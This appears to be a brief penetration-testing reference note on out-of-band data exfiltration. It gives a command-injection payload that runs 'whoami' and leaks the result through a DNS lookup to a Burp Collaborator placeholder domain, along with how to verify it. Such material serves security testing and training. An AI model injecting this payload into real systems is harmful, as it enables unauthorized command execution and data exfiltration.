# Out-of-Band Data Exfiltration Payloads

## Purpose

Retrieve command output through a DNS request.

---

## Example Payload

```text
nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN
```

---

## Verification

Poll Burp Collaborator after submitting the request.

---

## Expected Result

The DNS request contains the output of the `whoami` command.

Example:

```text
wwwuser.BURP-COLLABORATOR-SUBDOMAIN
```

---

# Key Takeaways

This technique allows command output to be recovered even when no HTTP response contains the data.